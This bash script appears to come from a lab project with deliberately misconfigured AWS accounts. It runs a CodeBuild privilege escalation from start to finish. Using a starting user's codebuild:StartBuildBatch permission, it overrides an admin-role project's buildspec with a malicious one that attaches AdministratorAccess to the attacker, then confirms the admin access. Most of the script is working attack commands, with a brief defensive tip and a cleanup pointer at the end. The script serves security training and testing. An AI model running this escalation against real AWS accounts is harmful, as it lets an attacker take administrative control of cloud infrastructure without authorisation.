#!/bin/bash

# Demo script for codebuild:StartBuildBatch privilege escalation
# This script demonstrates how a user with StartBuildBatch can exploit existing CodeBuild project with buildspec-override


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-codebuild-003-to-admin-starting-user"
TARGET_PROJECT="pl-prod-codebuild-003-to-admin-target-project"
TARGET_ROLE="pl-prod-codebuild-003-to-admin-target-role"
BUILDSPEC_FILE="/tmp/malicious-buildspec.yml"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CodeBuild StartBuildBatch Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_codebuild_003_codebuild_startbuildbatch.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Discover existing CodeBuild projects (reconnaissance)
echo -e "${YELLOW}Step 5: Discovering existing CodeBuild projects${NC}"
use_readonly_creds
echo "Attempting to list CodeBuild projects..."

show_cmd "ReadOnly" "aws codebuild list-projects --region $AWS_REGION --query 'projects' --output text"
PROJECTS=$(aws codebuild list-projects --region $AWS_REGION --query 'projects' --output text 2>/dev/null || echo "")

if [ -n "$PROJECTS" ]; then
    echo "Found projects:"
    echo "$PROJECTS" | tr '\t' '\n' | head -5
    echo -e "${GREEN}✓ Successfully listed projects${NC}"
else
    echo -e "${YELLOW}Could not list projects (codebuild:ListProjects not granted to readonly user)${NC}"
    echo "But we know the target project exists: $TARGET_PROJECT"
fi
echo ""

# [OBSERVATION] Step 6: Get details about the target project
echo -e "${YELLOW}Step 6: Getting target project details${NC}"
use_readonly_creds
echo "Target project: $TARGET_PROJECT"

show_cmd "ReadOnly" "aws codebuild batch-get-projects --region $AWS_REGION --names \"$TARGET_PROJECT\" --query 'projects[0]' --output json"
PROJECT_INFO=$(aws codebuild batch-get-projects \
    --region $AWS_REGION \
    --names "$TARGET_PROJECT" \
    --query 'projects[0]' \
    --output json 2>/dev/null || echo "")

if [ -n "$PROJECT_INFO" ]; then
    PROJECT_ROLE=$(echo "$PROJECT_INFO" | jq -r '.serviceRole // "unknown"')
    echo "Project service role: $PROJECT_ROLE"
    echo -e "${GREEN}✓ Retrieved project details${NC}"
else
    echo -e "${YELLOW}Could not get project details (codebuild:BatchGetProjects not granted to readonly user)${NC}"
    echo "But we know it exists and has an admin role attached"
fi
echo ""

# Step 7: Prepare malicious buildspec file
echo -e "${YELLOW}Step 7: Preparing malicious buildspec with batch format${NC}"
echo "Creating buildspec that will attach AdministratorAccess policy to our user..."
echo "Buildspec file: $BUILDSPEC_FILE"

# Create malicious buildspec in batch format
cat > "$BUILDSPEC_FILE" <<EOF
version: 0.2
batch:
  fast-fail: false
  build-list:
    - identifier: privesc_build
      buildspec: |
        version: 0.2
        phases:
          build:
            commands:
              - echo "Starting privilege escalation..."
              - aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
              - echo "Successfully attached AdministratorAccess policy to $STARTING_USER"
EOF

echo -e "${BLUE}Buildspec contents:${NC}"
cat "$BUILDSPEC_FILE"
echo ""
echo -e "${GREEN}✓ Malicious buildspec prepared${NC}\n"

# [EXPLOIT] Step 8: Start build batch with buildspec override
echo -e "${YELLOW}Step 8: Starting build batch with buildspec-override${NC}"
use_starting_creds
echo "This is the privilege escalation vector - overriding the buildspec..."
echo "Project: $TARGET_PROJECT"
echo "The build will execute with the project's admin role permissions"
echo ""

show_attack_cmd "Attacker" "aws codebuild start-build-batch --region $AWS_REGION --project-name \"$TARGET_PROJECT\" --buildspec-override file://\"$BUILDSPEC_FILE\" --output json"
BUILD_RESULT=$(aws codebuild start-build-batch \
    --region $AWS_REGION \
    --project-name "$TARGET_PROJECT" \
    --buildspec-override file://"$BUILDSPEC_FILE" \
    --output json)

if [ $? -eq 0 ]; then
    BUILD_BATCH_ID=$(echo "$BUILD_RESULT" | jq -r '.buildBatch.id')
    BUILD_BATCH_STATUS=$(echo "$BUILD_RESULT" | jq -r '.buildBatch.buildBatchStatus')
    echo "Build Batch ID: $BUILD_BATCH_ID"
    echo "Initial Status: $BUILD_BATCH_STATUS"
    echo -e "${GREEN}✓ Build batch started successfully${NC}"
else
    echo -e "${RED}Error: Failed to start build batch${NC}"
    exit 1
fi
echo ""

# [OBSERVATION] Step 9: Monitor build batch execution
echo -e "${YELLOW}Step 9: Monitoring build batch execution${NC}"
use_readonly_creds
echo "Waiting for build batch to complete..."
echo "This may take 2-3 minutes for batch build orchestration..."
echo ""

# Wait for build batch to complete
WAIT_TIME=0
MAX_WAIT=240  # 4 minutes for batch builds

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Get batch status
    show_cmd "ReadOnly" "aws codebuild batch-get-build-batches --region $AWS_REGION --ids \"$BUILD_BATCH_ID\" --output json"
    BATCH_INFO=$(aws codebuild batch-get-build-batches \
        --region $AWS_REGION \
        --ids "$BUILD_BATCH_ID" \
        --output json)

    BUILD_BATCH_STATUS=$(echo "$BATCH_INFO" | jq -r '.buildBatches[0].buildBatchStatus')

    echo "[${WAIT_TIME}s] Build batch status: $BUILD_BATCH_STATUS"

    if [ "$BUILD_BATCH_STATUS" = "SUCCEEDED" ]; then
        echo -e "${GREEN}✓ Build batch completed successfully${NC}"
        break
    elif [ "$BUILD_BATCH_STATUS" = "FAILED" ] || [ "$BUILD_BATCH_STATUS" = "FAULT" ] || [ "$BUILD_BATCH_STATUS" = "TIMED_OUT" ] || [ "$BUILD_BATCH_STATUS" = "STOPPED" ]; then
        echo -e "${RED}Build batch failed with status: $BUILD_BATCH_STATUS${NC}"
        echo "Check CodeBuild logs for details"
        exit 1
    fi

    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

if [ $WAIT_TIME -ge $MAX_WAIT ]; then
    echo -e "${RED}Build batch did not complete within ${MAX_WAIT} seconds${NC}"
    echo -e "${YELLOW}Note: The build may have succeeded but batch orchestration is taking longer${NC}"
    echo "Checking if policy was attached anyway..."

    # Try to verify if the policy was attached despite timeout
    if aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[?PolicyArn==`arn:aws:iam::aws:policy/AdministratorAccess`]' --output text 2>/dev/null | grep -q "AdministratorAccess"; then
        echo -e "${GREEN}✓ Policy was attached successfully despite timeout${NC}"
    else
        echo -e "${RED}Policy was not attached${NC}"
        exit 1
    fi
fi

echo ""

# Step 10: Wait for IAM policy propagation
echo -e "${YELLOW}Step 10: Waiting for IAM policy propagation${NC}"
echo "Waiting 15 seconds for IAM changes to propagate..."
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# [OBSERVATION] Step 11: Verify admin access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
use_readonly_creds
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "Note: IAM policy changes can take a few minutes to fully propagate"
    echo "You may need to wait a bit longer and try again"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with codebuild:StartBuildBatch permission)"
echo "2. Discovered existing CodeBuild project: $TARGET_PROJECT"
echo "3. Project has admin role attached: $TARGET_ROLE"
echo "4. Created malicious buildspec in batch format"
echo "5. Started build batch with --buildspec-override"
echo "6. Buildspec executed with admin role permissions"
echo "7. Buildspec attached AdministratorAccess policy to $STARTING_USER"
echo "8. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (codebuild:StartBuildBatch)"
echo -e "  → Existing project: $TARGET_PROJECT"
echo -e "  → Buildspec-override executes with $TARGET_ROLE"
echo -e "  → Attach AdministratorAccess to $STARTING_USER → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Build Batch ID: $BUILD_BATCH_ID"
echo "- AdministratorAccess policy attached to: $STARTING_USER"
echo "- Temporary buildspec file: $BUILDSPEC_FILE"

echo -e "\n${YELLOW}Key Insight:${NC}"
echo "The codebuild:StartBuildBatch permission with buildspec-override capability"
echo "allows execution of arbitrary code with the project's service role permissions."
echo "Always review which principals have StartBuildBatch on privileged projects!"

echo -e "\n${RED}⚠ Warning: The policy attachment remains${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
